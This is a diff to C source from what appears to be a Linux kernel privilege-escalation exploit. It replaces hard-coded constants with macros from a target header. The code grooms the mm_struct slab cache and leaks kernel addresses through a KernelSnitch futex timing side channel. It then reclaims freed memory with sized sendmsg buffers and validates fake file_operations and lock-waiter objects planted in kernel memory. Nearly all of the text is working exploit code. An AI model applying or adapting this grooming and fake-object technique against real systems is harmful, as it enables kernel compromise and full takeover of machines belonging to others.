@@ -26,6 +26,7 @@
 #include "04_fake_kernel_objects.h"
 #include "05_mm_slab_grooming.h"
 #include "02_slab_cache_probe.h"
+#include "target.h"
 
 /* Debug instrumentation (H0): attribute the groom+install wall time to its
  * sub-phases (process spray, KernelSnitch collision search, bruteforce leak).
@@ -57,20 +58,6 @@ static long groom_env_long_clamped(const char *name, long fallback, long lo,
 }
 #include "03_mm_address_sidechannel/mm_address_leak.h"
 
-#define OSS_PAGE_SIZE 4096
-#define OSS_MM_ORDER 3
-#define OSS_MM_STRUCT_SZ 0x400
-#define OSS_ORDER3_SIZE (OSS_PAGE_SIZE << OSS_MM_ORDER) /* 0x8000 */
-#define OSS_SKB_SEND_SIZE FOPS_INSTALL_PAGE_SIZE         /* exact 0x8e80 */
-#define OSS_MM_PARTIALS 5
-#define OSS_KSNITCH_COLLISIONS 4
-#define OSS_KSNITCH_REPEAT 64
-#define OSS_KSNITCH_APPENDED_DEFAULT 512
-#define OSS_SKB_RECLAIM_SENDS 64
-#define OSS_SKB_RECLAIM_MIN_FULL 48
-#define OSS_RECLAIM_QUIET_SAMPLE_MS 25
-#define OSS_RECLAIM_QUIET_STREAK 3
-#define OSS_RECLAIM_QUIET_MAX_SAMPLES 40
 #define OSS_FACTORY_COMMAND_FD 198
 #define OSS_FACTORY_READY_FD 199
 #define OSS_FACTORY_READY_MAGIC 0x4d4d5244u
@@ -632,7 +619,7 @@ static uint64_t load_u64(const unsigned char *buf, size_t off) {
 
 static uint64_t fops_object_fingerprint(const unsigned char *buf) {
   uint64_t hash = 1469598103934665603ULL;
-  for (size_t i = 0; i < FOPS_INSTALL_PAGE_SIZE; i++) {
+  for (size_t i = 0; i < TARGET_RECLAIM_BUFFER_SIZE; i++) {
     hash ^= buf[i];
     hash *= 1099511628211ULL;
   }
@@ -641,35 +628,45 @@ static uint64_t fops_object_fingerprint(const unsigned char *buf) {
 
 static int validate_fops_object(const unsigned char *buf,
                                 uint64_t aligned_base) {
-  return load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET) == 0 &&
-         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 8) ==
-             (aligned_base | 0x14e8ULL) &&
-         load_u64(buf, OSS_RECOVERY_FOPS_BUFFER_OFFSET) == 0 &&
-         load_u64(buf, OSS_RECOVERY_FOPS_BUFFER_OFFSET + 8) ==
-             (aligned_base | 0x14e8ULL) &&
-         memcmp(buf + OSS_PRIMARY_FOPS_BUFFER_OFFSET,
-                buf + OSS_RECOVERY_FOPS_BUFFER_OFFSET,
-                OSS_FAKE_FOPS_POPULATED_SIZE) == 0 &&
-         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x20) != 0 &&
-         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x28) != 0 &&
-         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x50) != 0 &&
-         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x70) != 0 &&
-         load_u64(buf, OSS_PRIMARY_FOPS_BUFFER_OFFSET + 0x80) != 0 &&
-         load_u64(buf, 0x2218) == (aligned_base | 0x14d0ULL) &&
-         load_u64(buf, 0x2220) == (aligned_base | 0x14d0ULL) &&
-         load_u64(buf, 0x2228) == 1;
+  return load_u64(buf, TARGET_PRIMARY_FOPS_BUFFER_OFF) == 0 &&
+         load_u64(buf, TARGET_PRIMARY_FOPS_BUFFER_OFF + 8) ==
+             (aligned_base | TARGET_PI_WAITERS_SELF_LIVE_OFF) &&
+         load_u64(buf, TARGET_RECOVERY_FOPS_BUFFER_OFF) == 0 &&
+         load_u64(buf, TARGET_RECOVERY_FOPS_BUFFER_OFF + 8) ==
+             (aligned_base | TARGET_PI_WAITERS_SELF_LIVE_OFF) &&
+         memcmp(buf + TARGET_PRIMARY_FOPS_BUFFER_OFF,
+                buf + TARGET_RECOVERY_FOPS_BUFFER_OFF,
+                TARGET_FAKE_FOPS_POPULATED_SIZE) == 0 &&
+         load_u64(buf, TARGET_PRIMARY_FOPS_BUFFER_OFF +
+                           TARGET_FOPS_READ_ITER_OFF) != 0 &&
+         load_u64(buf, TARGET_PRIMARY_FOPS_BUFFER_OFF +
+                           TARGET_FOPS_WRITE_ITER_OFF) != 0 &&
+         load_u64(buf,
+                  TARGET_PRIMARY_FOPS_BUFFER_OFF + TARGET_FOPS_IOCTL_OFF) !=
+             0 &&
+         load_u64(buf,
+                  TARGET_PRIMARY_FOPS_BUFFER_OFF + TARGET_FOPS_OPEN_OFF) !=
+             0 &&
+         load_u64(buf, TARGET_PRIMARY_FOPS_BUFFER_OFF +
+                           TARGET_FOPS_RELEASE_OFF) != 0 &&
+         load_u64(buf, TARGET_FAKE_LOCK_WAITERS_ROOT_OFF) ==
+             (aligned_base | TARGET_LOCK_WAITERS_SELF_LIVE_OFF) &&
+         load_u64(buf, TARGET_FAKE_LOCK_WAITERS_LEFTMOST_OFF) ==
+             (aligned_base | TARGET_LOCK_WAITERS_SELF_LIVE_OFF) &&
+         load_u64(buf, TARGET_FAKE_LOCK_OWNER_OFF) == 1;
 }
 
 static int validate_mm_candidate(uint64_t leaked, uint64_t *aligned_base,
                                  size_t *object_index) {
   if (leaked < KERNELSNITCH_IDENTITY_START ||
       leaked >= KERNELSNITCH_IDENTITY_END ||
-      (leaked & (OSS_MM_STRUCT_SZ - 1)) != 0) {
+      (leaked & (TARGET_MM_STRUCT_SIZE - 1)) != 0) {
     return 0;
   }
-  uint64_t base = leaked & ~(uint64_t)(OSS_ORDER3_SIZE - 1);
-  size_t index = (size_t)((leaked - base) / OSS_MM_STRUCT_SZ);
-  if ((base & (OSS_ORDER3_SIZE - 1)) != 0 || index >= 32) {
+  uint64_t base = leaked & ~(uint64_t)(TARGET_ORDER3_SIZE - 1);
+  size_t index = (size_t)((leaked - base) / TARGET_MM_STRUCT_SIZE);
+  if ((base & (TARGET_ORDER3_SIZE - 1)) != 0 ||
+      index >= TARGET_ORDER3_SIZE / TARGET_MM_STRUCT_SIZE) {
     return 0;
   }
   *aligned_base = base;
@@ -684,9 +681,9 @@ struct reclaim_slab_snapshot {
 };
 
 static int read_reclaim_slabs(struct reclaim_slab_snapshot *out) {
-  return read_named_slabinfo("mm_struct", &out->mm) &&
-         read_named_slabinfo("skbuff_head_cache", &out->skb) &&
-         read_named_slabinfo("kmalloc-4k", &out->kmalloc4k);
+  return read_named_slabinfo(TARGET_MM_CACHE_NAME, &out->mm) &&
+         read_named_slabinfo(TARGET_SKB_CACHE_NAME, &out->skb) &&
+         read_named_slabinfo(TARGET_KMALLOC_4K_CACHE_NAME, &out->kmalloc4k);
 }
 
 static int slab_activity_equal(const struct mm_slabinfo *a,
@@ -710,10 +707,10 @@ static int wait_for_reclaim_quiet_window(
     return 0;
   }
   int streak = 0;
-  for (int sample = 1; sample <= OSS_RECLAIM_QUIET_MAX_SAMPLES; sample++) {
+  for (int sample = 1; sample <= TARGET_RECLAIM_QUIET_MAX_SAMPLES; sample++) {
     struct timespec delay = {
         .tv_sec = 0,
-        .tv_nsec = OSS_RECLAIM_QUIET_SAMPLE_MS * 1000L * 1000L,
+        .tv_nsec = TARGET_RECLAIM_QUIET_SAMPLE_MS * 1000L * 1000L,
     };
     while (nanosleep(&delay, &delay) != 0 && errno == EINTR) {
     }
@@ -723,7 +720,7 @@ static int wait_for_reclaim_quiet_window(
     }
     streak = reclaim_slabs_equal(&previous, &current) ? streak + 1 : 0;
     previous = current;
-    if (streak >= OSS_RECLAIM_QUIET_STREAK) {
+    if (streak >= TARGET_RECLAIM_QUIET_STREAK) {
       *samples_out = sample;
       if (stable_out) *stable_out = current;
       fprintf(stderr,
@@ -735,7 +732,7 @@ static int wait_for_reclaim_quiet_window(
       return 1;
     }
   }
-  *samples_out = OSS_RECLAIM_QUIET_MAX_SAMPLES;
+  *samples_out = TARGET_RECLAIM_QUIET_MAX_SAMPLES;
   return 0;
 }
 
@@ -750,7 +747,7 @@ static int exact_mm_reclaim(const struct mm_slabinfo *before,
                                (long long)after->active_slabs;
   long long slab_drop =
       (long long)before->num_slabs - (long long)after->num_slabs;
-  int pass = object_drop == OSS_ORDER3_SIZE / OSS_MM_STRUCT_SZ &&
+  int pass = object_drop == TARGET_ORDER3_SIZE / TARGET_MM_STRUCT_SIZE &&
              active_slab_drop == 1 && slab_drop == 1;
   fprintf(stderr,
           "[groom] exact reclaim active_drop=%lld/%lu object_drop=%lld/32 "
@@ -775,7 +772,7 @@ static uint64_t groom_and_install_fops_object_impl(
   uint64_t dbg_t0 = groom_now_ms();
   uint64_t dbg_last = dbg_t0;
 
-  size_t mm_objs_per_slab = OSS_ORDER3_SIZE / OSS_MM_STRUCT_SZ; /* 32 */
+  size_t mm_objs_per_slab = TARGET_ORDER3_SIZE / TARGET_MM_STRUCT_SIZE; /* 32 */
 
   struct mm_ctx prepare_ctx = {0}, spray_ctx = {0}, pre_ctx = {0},
                 post_ctx = {0};
@@ -788,19 +785,19 @@ static uint64_t groom_and_install_fops_object_impl(
 
   if (!init_ctx(&prepare_ctx, 32 * mm_objs_per_slab) || /* 1024 */
       !init_ctx(&spray_ctx,
-                (1 + OSS_MM_PARTIALS) * mm_objs_per_slab) || /* 192 */
+                (1 + TARGET_MM_PARTIALS) * mm_objs_per_slab) || /* 192 */
       !init_ctx(&pre_ctx, mm_objs_per_slab - 1) ||            /* 31 */
       !init_ctx(&post_ctx, mm_objs_per_slab)) {               /* 32 */
     fprintf(stderr, "[groom] context allocation failed\n");
     goto cleanup;
   }
 
-  skb_buf = malloc(OSS_SKB_SEND_SIZE);
+  skb_buf = malloc(TARGET_RECLAIM_BUFFER_SIZE);
   if (!skb_buf) {
     fprintf(stderr, "[groom] skb buffer allocation failed\n");
     goto cleanup;
   }
-  memset(skb_buf, 0x41, OSS_SKB_SEND_SIZE);
+  memset(skb_buf, 0x41, TARGET_RECLAIM_BUFFER_SIZE);
 
   if (!fill_prepare_with_exec_factory(&prepare_ctx, factory_path)) {
     goto cleanup;
@@ -829,10 +826,10 @@ static uint64_t groom_and_install_fops_object_impl(
     fprintf(stderr, "[groom] invalid online CPU count=%d\n", cpu_count);
     goto cleanup;
   }
-  g_ks = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
-                            OSS_KSNITCH_COLLISIONS, 0, 0);
-  g_ks_verify = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
-                                   OSS_KSNITCH_COLLISIONS, 0, 0);
+  g_ks = kernelsnitch_setup(TARGET_MM_STRUCT_SIZE, TARGET_MM_SLAB_ORDER, cpu_count,
+                            TARGET_KSNITCH_COLLISIONS, 0, 0);
+  g_ks_verify = kernelsnitch_setup(TARGET_MM_STRUCT_SIZE, TARGET_MM_SLAB_ORDER, cpu_count,
+                                   TARGET_KSNITCH_COLLISIONS, 0, 0);
   if (!g_ks || !g_ks_verify) {
     fprintf(stderr, "[groom] kernelsnitch dual setup failed\n");
     goto cleanup;
@@ -849,10 +846,10 @@ static uint64_t groom_and_install_fops_object_impl(
     /* Keep the established repeat count. The smaller waiter pile was
      * measured in the isolated reference collision benchmark. */
     long ks_appended = groom_env_long_clamped(
-        "KSNITCH_APPENDED", OSS_KSNITCH_APPENDED_DEFAULT, 256,
+        "KSNITCH_APPENDED", TARGET_KSNITCH_APPENDED_GROOM, 256,
         APPENDED_FUTEXES);
     long ks_repeat = groom_env_long_clamped(
-        "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT, OSS_KSNITCH_REPEAT,
+        "KSNITCH_REPEAT", TARGET_KSNITCH_REPEAT_GROOM, TARGET_KSNITCH_REPEAT_GROOM,
         REPEAT_MEASUREMENT);
     kernelsnitch_set_profile(g_ks, (size_t)ks_appended, (size_t)ks_repeat,
                               g_ks->average);
@@ -976,7 +973,7 @@ static uint64_t groom_and_install_fops_object_impl(
     goto cleanup;
   }
 
-  struct iovec iov = {.iov_base = skb_buf, .iov_len = OSS_SKB_SEND_SIZE};
+  struct iovec iov = {.iov_base = skb_buf, .iov_len = TARGET_RECLAIM_BUFFER_SIZE};
   struct msghdr msg;
   memset(&msg, 0, sizeof(msg));
   msg.msg_iov = &iov;
@@ -986,10 +983,10 @@ static uint64_t groom_and_install_fops_object_impl(
   do {
     pcp_sent = sendmsg(pcp_sv[0], &msg, 0);
   } while (pcp_sent < 0 && errno == EINTR);
-  if (pcp_sent != (ssize_t)OSS_SKB_SEND_SIZE) {
+  if (pcp_sent != (ssize_t)TARGET_RECLAIM_BUFFER_SIZE) {
     fprintf(stderr,
             "[groom] pcp sendmsg incomplete sent=%zd want=%d errno=%d\n",
-            pcp_sent, OSS_SKB_SEND_SIZE, pcp_sent < 0 ? errno : 0);
+            pcp_sent, TARGET_RECLAIM_BUFFER_SIZE, pcp_sent < 0 ? errno : 0);
     goto cleanup;
   }
 
@@ -1140,11 +1137,11 @@ static uint64_t groom_and_install_fops_object_impl(
             critical_first_fd, critical_last_fd, close_error);
     goto cleanup;
   }
-  for (int i = 0; i < OSS_SKB_RECLAIM_SENDS; i++) {
+  for (int i = 0; i < TARGET_SKB_RECLAIM_SENDS; i++) {
     do {
       sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     } while (sent < 0 && errno == EINTR);
-    if (sent == (ssize_t)OSS_SKB_SEND_SIZE) {
+    if (sent == (ssize_t)TARGET_RECLAIM_BUFFER_SIZE) {
       reclaim_sent++;
       continue;
     }
@@ -1159,11 +1156,11 @@ static uint64_t groom_and_install_fops_object_impl(
           cage_count, seed_count, critical_count, sched_getcpu());
   fprintf(stderr,
           "[groom] mm drain triggers=%zu sk_buff reclaim sends=%d/%d\n",
-          drain_triggers, reclaim_sent, OSS_SKB_RECLAIM_SENDS);
+          drain_triggers, reclaim_sent, TARGET_SKB_RECLAIM_SENDS);
 
   long reclaim_min = groom_env_long_clamped(
-      "RMG_RECLAIM_MIN_FULL", OSS_SKB_RECLAIM_MIN_FULL,
-      OSS_SKB_RECLAIM_MIN_FULL, OSS_SKB_RECLAIM_SENDS);
+      "RMG_RECLAIM_MIN_FULL", TARGET_SKB_RECLAIM_MIN_FULL,
+      TARGET_SKB_RECLAIM_MIN_FULL, TARGET_SKB_RECLAIM_SENDS);
   if (reclaim_sent < reclaim_min || reclaim_incomplete) {
     fprintf(stderr,
             "[groom] reclaim batch rejected full=%d minimum=%ld "
@@ -1186,7 +1183,7 @@ static uint64_t groom_and_install_fops_object_impl(
   if (!wait_for_reclaim_quiet_window(&quiet_samples, NULL)) {
     fprintf(stderr,
             "[groom] reclaim quiet window rejected samples=%d required=%d\n",
-            quiet_samples, OSS_RECLAIM_QUIET_STREAK);
+            quiet_samples, TARGET_RECLAIM_QUIET_STREAK);
     goto cleanup;
   }
   char checkpoint[160];
